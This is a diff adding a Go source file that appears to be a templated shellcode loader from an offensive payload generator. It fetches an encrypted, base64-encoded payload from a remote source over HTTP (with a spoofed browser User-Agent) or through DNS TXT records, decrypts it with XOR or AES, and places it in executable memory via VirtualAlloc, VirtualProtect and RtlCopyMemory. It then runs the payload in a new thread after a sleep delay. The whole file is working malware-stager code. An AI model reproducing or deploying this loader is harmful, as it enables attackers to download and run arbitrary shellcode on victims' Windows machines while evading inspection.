@@ -1,0 +1,133 @@
+package main
+
+import (
+  "encoding/base64"
+  "syscall"
+  "unsafe"
+  "io/ioutil"
+  "net/http"
+  "net"
+  "crypto/aes"
+  "crypto/cipher"
+  "fmt"
+  "time"
+)
+
+const (
+        MEM_COMMIT = 0x1000
+        MEM_RESERVE = 0x2000
+        PAGE_EXECUTE_READ = 0x20
+        PAGE_READWRITE = 0x04
+)
+
+func HTTPDownload(download_src string) string {
+	req, _ := http.NewRequest("GET", download_src, nil)
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36")
+        client := &http.Client{}
+        resp, _ := client.Do(req)
+
+        defer resp.Body.Close()
+
+        content, _ := ioutil.ReadAll(resp.Body)
+        
+	return string(content)
+}
+
+func DNSDownload(download_src string) string {
+	records, _ := net.LookupTXT(download_src)
+
+	return records[0] 
+}
+
+func DecryptAES(ciphertext, key []byte) []byte {
+	c, _ := aes.NewCipher(key)
+	
+	IV := []byte("1234567812345678")
+
+	stream := cipher.NewCTR(c, IV)
+	stream.XORKeyStream(ciphertext, ciphertext)
+
+	return ciphertext
+}
+
+func DecryptXOR(ciphertext, key []byte) []byte {
+	plaintext := make([]byte, len(ciphertext))
+	
+	for i := 0; i < len(ciphertext); i++ {
+		plaintext[i] = ciphertext[i] ^ key[i % len(key)]
+	}
+
+	return plaintext
+}
+
+func main() {
+	// template variables
+	download_src := {{DOWNLOAD_SRC}}
+	debug := {{DEBUG}}
+	crypter_mode := {{CRYPTER_MODE}}
+	execution_mode := {{EXECUTION_MODE}}
+	download_mode := {{DOWNLOAD_MODE}}
+        key := {{KEY}}
+        randomizer := {{RANDOMIZER}}
+
+	ciphertext_b64 := ""
+	var plaintext []byte
+
+	if debug {
+        	fmt.Println("[+] Randomizer: ", randomizer)
+		fmt.Println("[+] Key: ", key)
+		fmt.Println("[+] Execution mode: ", execution_mode)
+	}
+
+	// download payload, base64 formatted string
+	if download_mode == "dns" {
+		ciphertext_b64 = DNSDownload(download_src)
+	} else {
+		ciphertext_b64 = HTTPDownload(download_src)
+	}
+
+	if debug {
+		fmt.Println("[+] Ciphertext: ", ciphertext_b64)
+	}
+
+	// base64 decode payload, now we have the ciphertext in byte array format
+        ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
+  
+	// decrypt ciphertext, still in byte array format, this is the shellcode
+	if crypter_mode == "xor" {
+		plaintext = DecryptXOR(ciphertext, []byte(key))
+	} else if crypter_mode == "aes" {
+		plaintext = DecryptAES(ciphertext, []byte(key))
+	} else {
+		plaintext = ciphertext
+	}
+
+	// load dlls
+        kernel32 := syscall.NewLazyDLL("kernel32.dll")
+        ntdll := syscall.NewLazyDLL("ntdll.dll")
+
+	// shellcode prep
+        VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+        VirtualProtect := kernel32.NewProc("VirtualProtect")
+        RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+        CreateThread := kernel32.NewProc("CreateThread")
+        WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+
+        addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(plaintext)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+        RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))
+
+        oldProtect := PAGE_READWRITE
+        VirtualProtect.Call(addr, uintptr(len(plaintext)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+
+	if debug {
+		fmt.Println("[+] Sleeping...")
+		time.Sleep(30 * time.Second)
+	} else {
+		time.Sleep(5 * time.Second)
+	}
+
+	// shellcode exec
+        thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+        WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+}
